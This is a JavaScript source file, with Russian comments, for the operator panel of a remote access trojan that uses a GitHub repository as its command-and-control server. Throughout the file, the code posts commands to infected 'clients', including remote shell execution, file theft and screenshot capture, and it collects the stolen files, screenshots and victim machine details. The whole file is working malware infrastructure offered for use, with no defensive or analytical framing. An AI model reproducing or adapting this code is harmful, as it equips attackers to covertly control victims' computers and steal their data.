// ============= КОНФИГУРАЦИЯ =============
// ⚠️ ВАЖНО: Замени на свои данные!
const GITHUB_USERNAME = "твой_логин";      // ТВОЙ ЛОГИН GITHUB
const GITHUB_REPO = "rat_c2";               // НАЗВАНИЕ РЕПОЗИТОРИЯ
const GITHUB_TOKEN = "ghp_твой_токен";      // ТВОЙ ТОКЕН

const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
let clients = [];
let seenFiles = [];
let autoRefresh = null;

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    
    // Ограничиваем количество логов
    while (logContainer.children.length > 200) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

async function githubRequest(url, method = "GET", data = null) {
    try {
        const options = {
            method: method,
            headers: HEADERS
        };
        
        if (data && (method === "PUT" || method === "DELETE")) {
            options.body = JSON.stringify(data);
        }
        
        const response = await fetch(url, options);
        
        if (response.status === 401) {
            addLog("❌ ОШИБКА АВТОРИЗАЦИИ! Проверьте токен GitHub", "error");
            document.getElementById("statusIndicator").classList.remove("online");
            document.getElementById("statusText").innerText = "ОШИБКА: НЕВЕРНЫЙ ТОКЕН";
            return null;
        }
        
        if (response.status === 404 && method !== "PUT") {
            return null;
        }
        
        if (response.status === 403) {
            addLog("⚠️ ЛИМИТ ЗАПРОСОВ GITHUB! Подождите...", "error");
            return null;
        }
        
        return await response.json();
    } catch (error) {
        addLog(`❌ Ошибка GitHub API: ${error.message}`, "error");
        return null;
    }
}

// ============= ОТПРАВКА КОМАНД =============
async function sendCommand(command, clientId = "all") {
    if (!command) return;
    
    addLog(`📨 ОТПРАВКА: ${command} ${clientId !== "all" ? `(Клиент: ${clientId})` : "(ВСЕМ)"}`, "success");
    
    try {
        let finalCommand = command;
        if (clientId !== "all") {
            finalCommand = `@${clientId} ${command}`;
        }
        
        // Получаем текущий commands.txt
        let url = `${API_URL}/commands.txt`;
        let response = await githubRequest(url);
        
        let currentContent = "";
        let sha = null;
        
        if (response && response.content) {
            currentContent = atob(response.content);
            sha = response.sha;
        }
        
        const newContent = currentContent + finalCommand + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        await githubRequest(url, "PUT", putData);
        addLog(`✅ КОМАНДА ОТПРАВЛЕНА: ${command}`, "success");
        
    } catch (error) {
        addLog(`❌ Ошибка отправки: ${error.message}`, "error");
    }
}

// ============= ОЧИСТКА КОМАНД =============
async function clearCommands() {
    try {
        const url = `${API_URL}/commands.txt`;
        const response = await githubRequest(url);
        
        if (response && response.sha) {
            const putData = {
                message: "Clear commands",
                content: btoa(""),
                sha: response.sha,
                branch: "main"
            };
            await githubRequest(url, "PUT", putData);
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

// ============= ОЧИСТКА ВСЕГО РЕПОЗИТОРИЯ =============
async function clearAllFiles() {
    if (!confirm("💣 ВНИМАНИЕ! Это удалит ВСЕ файлы из репозитория. Продолжить?")) return;
    
    try {
        const response = await githubRequest(API_URL);
        if (response && Array.isArray(response)) {
            let deleted = 0;
            for (const file of response) {
                if (file.name !== ".gitkeep") {
                    const deleteData = {
                        message: `Delete ${file.name}`,
                        sha: file.sha,
                        branch: "main"
                    };
                    await githubRequest(`${API_URL}/${file.name}`, "DELETE", deleteData);
                    deleted++;
                }
            }
            addLog(`💣 УДАЛЕНО ФАЙЛОВ: ${deleted}`, "success");
            seenFiles = [];
            loadResults();
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const response = await githubRequest(API_URL);
        if (!response || !Array.isArray(response)) return;
        
        const results = response.filter(f => f.name.startsWith("result_"));
        const screenshots = response.filter(f => f.name.startsWith("screenshot_"));
        const files = response.filter(f => f.name.startsWith("file_"));
        
        // Обновляем статистику
        document.getElementById("resultsCount").innerText = results.length;
        document.getElementById("screensCount").innerText = screenshots.length;
        document.getElementById("clientsCount").innerText = clients.length;
        
        // Обрабатываем новые результаты
        for (const file of [...results, ...screenshots, ...files]) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                
                if (file.name.startsWith("result_")) {
                    const content = await fetch(file.download_url).then(r => r.text());
                    addLog(`📥 НОВЫЙ РЕЗУЛЬТАТ: ${file.name}`, "result");
                    addLog(content.substring(0, 500), "result");
                    parseClientInfo(content);
                }
                
                if (file.name.startsWith("screenshot_")) {
                    addLog(`📸 НОВЫЙ СКРИНШОТ: ${file.name}`, "success");
                    updateScreensGrid();
                }
                
                if (file.name.startsWith("file_")) {
                    addLog(`📁 НОВЫЙ ФАЙЛ: ${file.name}`, "success");
                    updateFilesList();
                }
            }
        }
        
        updateClientsList();
        updateScreensGrid();
        updateFilesList();
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

// ============= ПАРСИНГ ИНФОРМАЦИИ О КЛИЕНТАХ =============
function parseClientInfo(content) {
    if (content.includes("[Connected]") || content.includes("PC:")) {
        const pcMatch = content.match(/PC:\s*([^\n]+)/);
        const userMatch = content.match(/User:\s*([^\n]+)/);
        const timeMatch = content.match(/Time:\s*([^\n]+)/);
        
        if (pcMatch) {
            const clientId = pcMatch[1].trim();
            if (!clients.find(c => c.id === clientId)) {
                clients.push({
                    id: clientId,
                    user: userMatch ? userMatch[1].trim() : "Unknown",
                    time: timeMatch ? timeMatch[1].trim() : new Date().toLocaleString(),
                    firstSeen: new Date().toLocaleString()
                });
                addLog(`💻 НОВЫЙ КЛИЕНТ ПОДКЛЮЧИЛСЯ: ${clientId} (${userMatch ? userMatch[1].trim() : "Unknown"})`, "client");
                updateClientsList();
            }
        }
    }
}

// ============= ОБНОВЛЕНИЕ СПИСКА КЛИЕНТОВ =============
function updateClientsList() {
    const select = document.getElementById("clientSelect");
    const clientsDiv = document.getElementById("clientsList");
    
    // Обновляем селект
    select.innerHTML = '<option value="all">ВСЕ КЛИЕНТЫ</option>';
    
    if (clients.length === 0) {
        clientsDiv.innerHTML = '<div class="empty-message">Нет подключенных клиентов</div>';
        return;
    }
    
    clientsDiv.innerHTML = "";
    
    for (const client of clients) {
        select.innerHTML += `<option value="${client.id}">${client.id}</option>`;
        
        const clientCard = document.createElement("div");
        clientCard.className = "client-card";
        clientCard.setAttribute("data-client", client.id);
        clientCard.onclick = () => {
            document.querySelectorAll(".client-card").forEach(c => c.classList.remove("selected"));
            clientCard.classList.add("selected");
            document.getElementById("clientSelect").value = client.id;
            addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
        };
        
        clientCard.innerHTML = `
            <div class="client-name">🖥️ ${client.id}</div>
            <div class="client-info">👤 ${client.user}</div>
            <div class="client-time">🕐 Подключен: ${client.firstSeen}</div>
        `;
        clientsDiv.appendChild(clientCard);
    }
}

// ============= ОБНОВЛЕНИЕ СЕТКИ СКРИНШОТОВ =============
async function updateScreensGrid() {
    const response = await githubRequest(API_URL);
    if (!response || !Array.isArray(response)) return;
    
    const screenshots = response.filter(f => f.name.startsWith("screenshot_")).reverse();
    const grid = document.getElementById("screensGrid");
    
    if (screenshots.length === 0) {
        grid.innerHTML = '<div class="empty-message">Нет скриншотов</div>';
        return;
    }
    
    grid.innerHTML = "";
    
    for (const screenshot of screenshots) {
        const card = document.createElement("div");
        card.className = "screenshot-card";
        card.onclick = () => showModal(screenshot.download_url);
        
        card.innerHTML = `
            <img src="${screenshot.download_url}" alt="${screenshot.name}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'150\'%3E%3Crect width=\'200\' height=\'150\' fill=\'%230a0e27\'/%3E%3Ctext x=\'100\' y=\'75\' fill=\'%2300ff41\' text-anchor=\'middle\'%3E${screenshot.name}%3C/text%3E%3C/svg%3E'">
            <div class="info">${screenshot.name}</div>
        `;
        grid.appendChild(card);
    }
}

// ============= ОБНОВЛЕНИЕ СПИСКА ФАЙЛОВ =============
async function updateFilesList() {
    const response = await githubRequest(API_URL);
    if (!response || !Array.isArray(response)) return;
    
    const files = response.filter(f => f.name.startsWith("file_")).reverse();
    const list = document.getElementById("filesList");
    
    if (files.length === 0) {
        list.innerHTML = '<div class="empty-message">Нет загруженных файлов</div>';
        return;
    }
    
    list.innerHTML = "";
    
    for (const file of files) {
        const item = document.createElement("div");
        item.className = "file-item";
        
        item.innerHTML = `
            <span class="file-name">📄 ${file.name}</span>
            <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
        `;
        list.appendChild(item);
    }
}

// ============= МОДАЛЬНОЕ ОКНО =============
function showModal(imageUrl) {
    let modal = document.getElementById("imageModal");
    if (!modal) {
        modal = document.createElement("div");
        modal.id = "imageModal";
        modal.className = "modal";
        modal.innerHTML = `
            <span class="modal-close">&times;</span>
            <img src="" alt="Screenshot">
        `;
        document.body.appendChild(modal);
        
        modal.querySelector(".modal-close").onclick = () => {
            modal.classList.remove("active");
        };
        modal.onclick = (e) => {
            if (e.target === modal) modal.classList.remove("active");
        };
    }
    
    modal.querySelector("img").src = imageUrl;
    modal.classList.add("active");
}

// ============= ПРОВЕРКА ПОДКЛЮЧЕНИЯ =============
async function testConnection() {
    const indicator = document.getElementById("statusIndicator");
    const statusText = document.getElementById("statusText");
    
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ К GITHUB...", "system");
    
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        
        if (response.ok) {
            const user = await response.json();
            indicator.classList.add("online");
            statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ПОЛЬЗОВАТЕЛЬ: ${user.login}`;
            addLog(`✅ ПОДКЛЮЧЕНИЕ УСПЕШНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            return true;
        } else if (response.status === 401) {
            indicator.classList.remove("online");
            statusText.innerHTML = "❌ ОШИБКА: НЕВЕРНЫЙ ТОКЕН";
            addLog("❌ ОШИБКА АВТОРИЗАЦИИ! Проверьте токен GitHub", "error");
            return false;
        } else {
            indicator.classList.remove("online");
            statusText.innerHTML = `❌ ОШИБКА: ${response.status}`;
            return false;
        }
    } catch (error) {
        indicator.classList.remove("online");
        statusText.innerHTML = "❌ ОШИБКА ПОДКЛЮЧЕНИЯ";
        addLog(`❌ НЕ УДАЛОСЬ ПОДКЛЮЧИТЬСЯ: ${error.message}`, "error");
        return false;
    }
}

// ============= ЗАПУСК АВТООБНОВЛЕНИЯ =============
function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => {
        loadResults();
    }, 5000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system");
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
async function init() {
    addLog("🐀 SPYMASTER C2 PANEL v4.0 ЗАПУЩЕН", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    
    const connected = await testConnection();
    if (connected) {
        startAutoRefresh();
        await loadResults();
    }
    
    // Привязываем обработчики
    document.querySelectorAll(".cmd-btn").forEach(btn => {
        btn.addEventListener("click", () => {
            const cmd = btn.getAttribute("data-cmd");
            const client = document.getElementById("clientSelect").value;
            sendCommand(cmd, client);
        });
    });
    
    document.querySelectorAll(".cmd-small").forEach(btn => {
        if (!btn.id) {
            btn.addEventListener("click", () => {
                const cmd = btn.getAttribute("data-cmd");
                if (cmd) {
                    const client = document.getElementById("clientSelect").value;
                    sendCommand(cmd, client);
                }
            });
        }
    });
    
    document.getElementById("sendCustomBtn").addEventListener("click", () => {
        const cmd = document.getElementById("customCmd").value;
        const client = document.getElementById("clientSelect").value;
        if (cmd) sendCommand(cmd, client);
        document.getElementById("customCmd").value = "";
    });
    
    document.getElementById("downloadBtn").addEventListener("click", () => {
        const path = document.getElementById("downloadPath").value;
        if (path) {
            const client = document.getElementById("clientSelect").value;
            sendCommand(`/download ${path}`, client);
        }
    });
    
    document.getElementById("shellBtn").addEventListener("click", () => {
        const cmd = document.getElementById("shellCmd").value;
        if (cmd) {
            const client = document.getElementById("clientSelect").value;
            sendCommand(`/cmd ${cmd}`, client);
        }
    });
    
    document.getElementById("clearCommandsBtn").addEventListener("click", clearCommands);
    document.getElementById("clearAllBtn").addEventListener("click", clearAllFiles);
    document.getElementById("refreshBtn").addEventListener("click", () => {
        loadResults();
        addLog("🔄 РУЧНОЕ ОБНОВЛЕНИЕ", "system");
    });
    
    // Вкладки
    document.querySelectorAll(".tab-btn").forEach(btn => {
        btn.addEventListener("click", () => {
            document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
            document.querySelectorAll(".tab-content").forEach(t => t.classList.remove("active"));
            btn.classList.add("active");
            document.getElementById(`${btn.getAttribute("data-tab")}Tab`).classList.add("active");
        });
    });
}

// Запуск
document.addEventListener("DOMContentLoaded", init);